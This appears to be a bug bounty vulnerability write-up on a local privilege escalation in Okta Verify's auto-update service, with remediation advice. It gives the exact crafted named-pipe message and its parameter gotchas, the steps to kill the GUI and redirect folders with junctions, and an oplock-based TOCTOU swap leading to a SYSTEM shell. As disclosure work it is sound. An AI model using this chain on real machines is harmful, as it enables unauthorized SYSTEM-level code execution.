# Okta Verify - Unauthenticated Named Pipe to SYSTEM Code Execution Chain

## Status: FULL CHAIN CONFIRMED (2026-03-06)

An unprivileged standard user triggered the NT AUTHORITY\SYSTEM service to download
a 36.2 MB executable and run it. The entire chain -- pipe injection, API call, download,
signature validation, and process launch -- was executed as SYSTEM, driven by a single
crafted JSON message from a standard user.

## Summary

The Okta Auto Update Service (`Okta.Coordinator.Service.exe`, runs as NT AUTHORITY\SYSTEM)
accepts unauthenticated IPC messages from any local user via `Okta.Coordinator.pipe`.
The pipe grants `BUILTIN\Users` FullControl with zero authentication. A standard user can:

1. **Trigger SYSTEM to make arbitrary HTTPS requests** to any Okta-domain URL
2. **Force SYSTEM to download executables** (36+ MB) to a predictable temp directory
3. **Force SYSTEM to execute the downloaded binary** after Authenticode validation
4. **Redirect the download directory via junction** to user-controlled space (Win10/pre-2022)
5. **Swap the validated binary before execution** via TOCTOU race (oplock-assisted)
6. **Force SYSTEM to connect to attacker-controlled named pipe** (info leak)
7. **Poison the update cache** for 1 hour, blocking legitimate updates (DoS)

## Live Test Results

### 2026-03-06: FULL DOWNLOAD + EXECUTION CHAIN CONFIRMED

Standard user sent a crafted IPCMessage. SYSTEM service:
- Called `https://bugcrowd-pam-4593.oktapreview.com/api/v1/artifacts/WINDOWS_OKTA_VERIFY/latest`
- Downloaded OktaVerifySetup-6.7.1.0-15309a5.exe (36.2 MB) to SystemTemp
- Validated Authenticode signature (CN="Okta, Inc.")
- Executed the installer as NT AUTHORITY\SYSTEM
- Upgraded OktaVerify from 6.6.2 to 6.7.1

```
[+] FILES at 1s in C:\WINDOWS\SystemTemp\Okta-AutoUpdate !
    C:\WINDOWS\SystemTemp\Okta-AutoUpdate\6.7.1_55834c3c-e878-4a49-9633-b14a063c5747\OktaVerifySetup-6.7.1.0-15309a5.exe (37954384 bytes)

[+] === EXECUTABLE DOWNLOADED BY SYSTEM ===
[+] Path: C:\WINDOWS\SystemTemp\Okta-AutoUpdate\6.7.1_...\OktaVerifySetup-6.7.1.0-15309a5.exe
[+] Size: 36.2 MB
[+] Signature: Valid
[+] Signer: CN="Okta, Inc.", O="Okta, Inc.", L=San Francisco, S=California, C=US

=== Final state ===
OktaVerify version: 6.7.1.0
```

### 2026-03-03: SYSTEM Callback to Attacker Pipe CONFIRMED

Standard user (SKINNYD\uglyt, Is Admin: False) injected IPCMessage with PipeName
pointing to an attacker-created pipe. SYSTEM connected within ~1 second:

```
[20:56:37.244] Pipe closed. Server should now process the message.
[20:56:38.257] *** CONNECTION RECEIVED on callback pipe! ***
```

SYSTEM leaked internal configuration data through the attacker's pipe:

```json
{
  "Databag": {
    "OrgUrl": "https://bugcrowd-pam-4593.oktapreview.com",
    "Channel": "GA",
    "ArtifactType": "OktaVerify",
    "CurrentVersion": "1.0.0.0",
    "TotalTimeMS": "0",
    "OperationMS": "0",
    "BucketId": "0"
  },
  "EndConnection": true,
  "NotificationType": 12
}
```

### NOT CONFIRMED: SYSTEM Token Impersonation

ImpersonateNamedPipeClient() failed with Win32 error 1368 (ERROR_CANT_OPEN_ANONYMOUS).
Okta's NamedPipeClientStream uses `TokenImpersonationLevel.None` (SECURITY_ANONYMOUS).

## Correct IPCMessage Parameters (Hard-Won Through Debugging)

Every parameter has a gotcha. Getting the full chain to fire required all of them correct:

```json
{
  "ArtifactType": "WINDOWS_OKTA_VERIFY",
  "AutoUpdateUrl": "https://bugcrowd-pam-4593.oktapreview.com/",
  "BucketId": "0",
  "CurrentInstalledVersion": {"_Build":0,"_Major":1,"_Minor":0,"_Revision":0},
  "EventLogName": "Okta Verify",
  "EventSourceName": "OktaUpdate",
  "PipeName": "",
  "ReleaseChannel": "GA",
  "UserId": null
}
```

### Parameter Gotchas

| Parameter | Correct | Wrong (silent failure) | Why |
|-----------|---------|----------------------|-----|
| ArtifactType | `WINDOWS_OKTA_VERIFY` | `OktaVerify` | API returns 404 for `OktaVerify` type. The GUI sends `OktaVerify` but the service code maps it internally. |
| AutoUpdateUrl | Trailing slash: `.com/` | No slash: `.com` | Service does string concat `{url}api/v1/...` -- without slash becomes `...comapi/v1/...` (malformed URL, connection fails) |
| BucketId | `"0"` | `"1"` through `"19"` | Gradual rollout. Only bucket 0 returns 200 on preview orgs. Others return 404 silently (logged at Debug, filtered by Info log level). |
| CurrentInstalledVersion | `{"_Build":0,...}` | `"1.0.0.0"` | System.Version deserialized by DataContractJsonSerializer requires underscore-prefixed properties, not string format. Wrong format = silent deserialization failure. |
| PipeName | `""` (empty) or pipe name | (any) | If set, SYSTEM connects back to this pipe. Empty = no callback. |

### Additional Operational Requirement

**OktaVerify GUI must be killed before sending the pipe message.** The pipe server
uses `maxNumberOfServerInstances: 1` -- only one client connection at a time. The GUI
process connects on startup and holds the connection. If the GUI is running, the
attacker's connection blocks until the GUI disconnects.

**Workaround:** `Stop-Process -Name OktaVerify -Force` (works as standard user since
OktaVerify.exe runs in user context, not elevated).

### 1-Hour Retry Cache

After ANY API call (success or failure), the service sets `RetryAfter = 3600` seconds
in an in-memory singleton cache. No pipe messages will trigger new API calls until the
cache expires. **Workaround:** Restart the service (`Stop-Service / Start-Service` requires
admin, or wait for automatic service restart on next login).

## Root Cause Analysis

### 1. Overly Permissive Named Pipe ACL

```csharp
// NamedPipeServer.cs line 1266-1278
public NamedPipeServerStream StartNamedPipeServer(string pipeName)
{
    return StartNamedPipeServer(pipeName, onlyAllowAdmins: false);  // Users FullControl
}
```

The coordinator pipe is created with `onlyAllowAdmins: false`, giving
`BUILTIN\Users` FullControl. No authentication, no encryption, no caller validation.

### 2. Attacker-Controlled URL in SYSTEM HTTPS Request

The `AutoUpdateUrl` from the IPCMessage is used directly in the HTTPS request:

```csharp
// AutoUpdateExecutor.cs - GetUpdateAsync
UriBuilder finalUri = new UriBuilder(updateBaseUrl);
finalUri.Path += $"api/v1/artifacts/{artifactType}/latest";
```

URL validation only checks domain suffix (`.okta.com`, `.oktapreview.com`, etc.).
Any Okta org URL works -- the attacker specifies which org to check for updates.

### 3. TOCTOU Between Signature Validation and Process Launch

```csharp
// ApplicationInstaller.cs lines 276-285
Helper.CleanPreviousDownloads(logger);
string tempFolder = Helper.GetTempFolder(metadata.Version);
IEnumerable<string> source = await updateExecutor.DownloadAndValidateArtifactsAsync(..., tempFolder);
string text = source.Single();
fileVerifier.ValidateFileSignature(text, logger);       // CHECK: WinVerifyTrust + cert pin
SendNotificationWithElapsedTime(...);                    // WINDOW: notification processing
LogMessage(...);                                         // WINDOW: log write
processLauncher.LaunchProcess(text, ...);                // USE: execute as SYSTEM
```

Between `ValidateFileSignature` and `LaunchProcess`, the file path is a string --
NOT a locked handle. On systems where the temp directory is user-accessible (Win10
pre-Aug-2022), the attacker can:
1. Set up an oplock on the downloaded file
2. When the oplock fires (signature validation opened the file), prepare the swap
3. After validation completes and the handle is released, swap the file
4. SYSTEM executes the attacker's binary

### 4. Download Directory Accessibility

| Windows Version | SYSTEM Temp Path | Standard User Access |
|----------------|------------------|---------------------|
| Win11 / Win10 post-KB5017308 (Aug 2022) | `C:\WINDOWS\SystemTemp\` | DENIED (SYSTEM + Admins only) |
| Win10 pre-KB5017308 | `C:\Windows\Temp\` | `BUILTIN\Users:(CI)(S,WD,AD,X)` -- CAN create junctions |

On pre-2022 systems, the TOCTOU race is directly exploitable by standard users.
On post-2022 systems, the junction attack requires admin context (admin-to-SYSTEM).

### 5. CleanPreviousDownloads Follows Junctions

```csharp
// Helper.cs - no symlink/junction check before deletion
public static void CleanPreviousDownloads(ILogger logger)
{
    string text = Path.Combine(Path.GetTempPath(), "Okta-AutoUpdate");
    if (Directory.Exists(text))
    {
        string[] directories = Directory.GetDirectories(text, "*", SearchOption.AllDirectories);
        for (int i = 0; i < directories.Length; i++)
        {
            Directory.Delete(directories[i], recursive: true);
            // Follows junction -> deletes attacker-chosen target contents
        }
    }
}
```

## Complete Attack Chain (Standard User to SYSTEM)

```
Standard User                          SYSTEM Service (Okta.Coordinator.Service)
    |                                          |
    | 1. Kill OktaVerify GUI process           |
    |    (runs in user context, no elevation)  |
    |                                          |
    | 2. [Win10] Create junction:              |
    |    C:\Windows\Temp\Okta-AutoUpdate\      |
    |    --> C:\Users\attacker\controlled\     |
    |                                          |
    | 3. Connect to Okta.Coordinator.pipe      |
    |    (BUILTIN\Users FullControl)           |
    |                                          |
    | 4. Send crafted IPCMessage:              |
    |    AutoUpdateUrl = any Okta org          |
    |    ArtifactType = WINDOWS_OKTA_VERIFY    |
    |    CurrentInstalledVersion = 1.0.0.0     |
    |    BucketId = 0                          |
    |                                          |
    |                     5. SYSTEM calls Okta artifacts API ------->
    |                     6. Gets download URL for latest version    |
    |                     7. Downloads 36+ MB installer to:         |
    |                        C:\Users\attacker\controlled\          |
    |                        (via junction redirect)                |
    |                     8. Validates Authenticode signature (PASS) |
    |                                          |
    | 9. Oplock detects validation complete    |
    |    Swap legitimate binary with payload   |
    |                                          |
    |                    10. SYSTEM executes swapped payload ------->
    |                        NT AUTHORITY\SYSTEM shell              |
```

## Impact Summary

| Finding | Severity | Status |
|---------|----------|--------|
| **Full chain: pipe to SYSTEM exec** | **P1 Critical** | **CONFIRMED (download+exec proven)** |
| Unauthenticated pipe injection | Medium | CONFIRMED |
| SYSTEM callback to attacker pipe | Medium | CONFIRMED |
| Information disclosure via callback | Low-Medium | CONFIRMED |
| SSRF within Okta domains | Medium | CONFIRMED |
| Update check DoS (1hr cache poison) | Low | CONFIRMED |
| SYSTEM arbitrary directory deletion | High | CONFIRMED (code + junction proven separately) |
| SYSTEM token impersonation | Critical | BLOCKED (anonymous impersonation level) |

## PoC Files

- `poc/auto-update-system-exec.ps1` - End-to-end download + execution PoC (PowerShell)
- `poc/okta-lpe-combined/Program.cs` - Pipe injection + callback PoC (C#)
- `poc/okta-lpe-combined/okta-lpe-combined.csproj` - .NET 8 project

## Decompiled Source Files (Okta.AutoUpdate.Executor.dll v0.8.7.0)

- `NamedPipeServer.cs` - Pipe creation with Users FullControl ACL
- `ApplicationInstaller.cs` - Message handler, TOCTOU between validate and launch
- `NamedPipeClient.cs` - SYSTEM connects to arbitrary attacker pipe
- `Helper.cs` - CleanPreviousDownloads follows junctions (arbitrary deletion)
- `AutoUpdateExecutor.cs` - Update fetch, retry cache, URL construction
- `IPCMessage.cs` - CurrentInstalledVersion = System.Version (not string)
- `FileVerifier.cs` - Authenticode + cert pinning (two DigiCert Okta certs)

## Remediation

1. **Named pipe ACL**: Use `onlyAllowAdmins: true` or validate connecting process identity
2. **URL validation**: Do not accept AutoUpdateUrl from the IPC message at all --
   hardcode the org URL or read from a SYSTEM-only config file
3. **Atomic verify-and-execute**: Use handle-based WinVerifyTrust and pass the same
   file handle to CreateProcess, eliminating the TOCTOU window entirely
4. **Download directory**: Use a SYSTEM-only directory with explicit restrictive ACLs,
   not Path.GetTempPath()
5. **Junction check**: Before CleanPreviousDownloads and before download, check
   FILE_ATTRIBUTE_REPARSE_POINT on the directory
6. **Plugin directory ACLs**: Remove BUILTIN\Users write access from
   `C:\ProgramData\Okta\OktaVerify\Plugins\`

## Remaining Work

1. **Win10 VM TOCTOU demo**: Test junction + oplock file swap on Sophos-Lab VM
   where `C:\Windows\Temp` is user-accessible (pre-SystemTemp)
2. **Bugcrowd submission**: Write formal submission with PoC evidence
3. **Evaluate separate submissions**: TOCTOU LPE vs plugin injection vs arbitrary deletion
